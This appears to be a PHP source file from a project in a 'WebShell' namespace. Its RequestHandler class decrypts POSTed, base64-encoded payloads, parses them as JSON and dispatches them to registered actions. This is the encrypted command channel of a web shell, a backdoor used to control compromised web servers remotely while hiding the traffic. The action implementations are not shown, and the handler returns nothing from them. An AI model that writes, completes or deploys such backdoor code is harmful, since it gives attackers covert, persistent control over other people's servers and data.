<?php
namespace WebShell;

class RequestHandler extends Singleton
{
    private $actions = [];

    public function addAction(string $key, Action $action): void
    {
        $this->actions[$key] = $action;
    }

    public function handle(): string
    {
        // Security service instance
        $securityService = SecurityService::getInstance();

        // Decrypt the request
        $iv = base64_decode($_POST['iv']);
        $body = $securityService->decrypt($_POST['body'], $iv);

        // Parse the body
        $request = json_decode($body);

        // Check if there is an appropriate handler configured
        if (array_key_exists($request->action, $this->actions)) {
            // Call the appropriate action
            $this->actions[$request->action]->run($request->args);
        }

        // Set the content-type header
        header('Content-Type: application/json');
        return '';
    }
}
?>
